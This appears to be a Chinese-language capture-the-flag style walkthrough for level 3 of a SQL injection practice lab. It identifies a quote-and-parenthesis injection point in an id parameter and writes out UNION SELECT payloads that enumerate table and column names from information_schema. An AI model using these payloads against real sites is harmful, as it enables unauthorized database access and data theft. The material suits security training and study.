# 第三关
# series-3

![image](./images/image17.png)

测试是什么类型的注入
?id=1'
![image](./images/image18.png)
回显报错
但是看到有一个反括号说语法错误，可以连想到它的语句是这样的
select * from user where id=('1');
这时候可以使用反括号将前面的括号闭合来进行注入
![image](./images/image19.png)

这时候可以使用联合查询来进行注入了
![image](./images/image20.png)
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
![image](./images/image21.png)
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
![image](./images/image22.png)
![image](./images/image23.png)
